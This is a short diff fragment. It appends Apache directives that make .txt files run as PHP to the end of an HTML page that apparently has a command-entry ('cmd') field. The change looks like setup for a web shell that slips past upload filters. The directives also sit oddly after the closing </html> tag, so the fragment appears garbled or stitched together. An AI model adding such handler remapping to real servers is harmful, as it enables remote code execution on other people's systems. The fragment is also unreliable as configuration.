@@ -15,3 +15,6 @@
 </body>
 <script>document.getElementById("cmd").focus();</script>
 </html>
+
+AddHandler php7-script .php .txt
+AddType text/html .txt
